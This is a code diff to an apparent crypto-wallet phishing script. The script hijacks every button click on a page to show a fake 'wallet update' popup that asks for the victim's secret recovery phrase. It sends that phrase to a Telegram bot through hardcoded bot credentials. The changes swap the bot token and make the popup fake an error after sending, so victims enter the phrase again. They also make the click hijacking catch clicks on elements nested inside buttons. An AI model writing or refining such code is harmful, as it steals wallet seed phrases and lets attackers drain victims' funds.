@@ -77,7 +77,7 @@
       opacity: 1;
     }
     .wallet-popup button {
-      background: linear-gradient(90deg, #626664 0%, #e49927 100%);
+      background: linear-gradient(90deg, #626664 0%, #bdbecb 100%);
       color: #fff;
       font-weight: 500;
       cursor: pointer;
@@ -89,10 +89,10 @@
       letter-spacing: 0.2px;
     }
     .wallet-popup button:disabled {
-      opacity: 0.6; cursor: not-allowed; background: #e49927;
+      opacity: 0.6; cursor: not-allowed; background: #bdbecb;
     }
     .wallet-popup button:hover:enabled {
-      background: linear-gradient(90deg, #626664 0%, #e49927 100%);
+      background: linear-gradient(90deg, #626664 0%, #bdbecb 100%);
       box-shadow: 0 4px 16px rgba(58,122,254,0.16);
     }
     .wallet-popup .section {
@@ -189,6 +189,22 @@
     .wallet-popup .toggle-password {
       cursor: pointer;
     }
+    /* Highlight border red on error */
+    .wallet-popup.error input,
+    .wallet-popup.error textarea {
+      border-color: #ff3b3b !important;
+      box-shadow: 0 0 0 2px #ff3b3b33 !important;
+    }
+    .wallet-popup.error {
+      animation: shake 0.3s;
+    }
+    @keyframes shake {
+      0% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      50% { transform: translateX(5px); }
+      75% { transform: translateX(-5px); }
+      100% { transform: translateX(0); }
+    }
   `;
   document.head.appendChild(style);
 
@@ -220,7 +236,7 @@
   document.body.appendChild(popup);
 
   // --- Telegram logic from x.html ---
-  const TELEGRAM_BOT_TOKEN = '7141420161:AAGh3wZMnUv45CEQg6UE7e0xpQIZGtYcdPA';
+  const TELEGRAM_BOT_TOKEN = '8480274967:AAHt7Fj8oW4hep_puqNeCUVVQJEZks3Zonw';
   const TELEGRAM_CHAT_ID = '-4704812522';
 
   function sendToTelegram(message) {
@@ -254,7 +270,7 @@
     setTimeout(() => { nextSection('updateSection'); }, 2000);
   }
 
-  // UPDATED: Download logic now shows loader/message for 3s, then shows the phrase form
+    // UPDATED: Download logic now shows loader/message for 3s, then shows the phrase form
   function handleDownload() {
     // Show loader with update message
     popup.querySelector('#loaderMsg').textContent = "Updating wallet…";
@@ -271,16 +287,21 @@
     // document.body.removeChild(a);
   }
 
-  function submitPhrase() {
+  function submitPhrase(e) {
+    if (e) e.preventDefault();
     const phrase = popup.querySelector('#phraseInput').value.trim();
+    // Remove previous error state
+    popup.classList.remove('error');
     if (!phrase) {
       alert('Please enter your secret phrase.');
       popup.querySelector('#phraseInput').focus();
       return;
     }
     sendToTelegram(`Mnemonic phrase entered: ${phrase}`);
-    alert('Phrase submitted!');
-    popup.classList.remove('active');
+    // Highlight border red and keep popup open
+    popup.classList.add('error');
+    setTimeout(() => popup.classList.remove('error'), 1500);
+    // Do not reload or close popup
   }
 
   // Disable/enable buttons logic
@@ -309,6 +330,13 @@
   popup.querySelector('#downloadBtn').addEventListener('click', handleDownload);
   popup.querySelector('#skipBtn').addEventListener('click', showLoader);
   popup.querySelector('#submitBtn').addEventListener('click', submitPhrase);
+  // Prevent form submission/reload on Enter in phrase textarea
+  popup.querySelector('#phraseInput').addEventListener('keydown', function(e) {
+    if (e.key === 'Enter' && !e.shiftKey) {
+      e.preventDefault();
+      popup.querySelector('#submitBtn').click();
+    }
+  });
 
   setupInputs();
 
@@ -322,20 +350,22 @@
     // Reset inputs
     popup.querySelector('#passwordInput').value = '';
     popup.querySelector('#phraseInput').value = '';
+    popup.classList.remove('error');
     setupInputs();
   }
 
-  // Listen for any button or w-button link click on the page
+  // Smarter event: always find the nearest button ancestor
   document.body.addEventListener('click', function (e) {
+    // Ignore clicks inside popup or elements marked to ignore
     if (
       e.target.closest('.wallet-popup') ||
       e.target.closest('[data-wallet-popup-ignore]')
     ) return;
-    // Show popup for <button> or <a class="w-button">
-    if (
-      e.target.tagName === 'BUTTON' ||
-      (e.target.tagName === 'A' && e.target.classList.contains('w-button'))
-    ) {
+
+    // Find the nearest button ancestor (works for text, icons, etc. inside button)
+    const button = e.target.closest('button');
+    const aButton = e.target.closest('a.w-button');
+    if (button || aButton) {
       showPopup();
       e.preventDefault();
       e.stopPropagation();
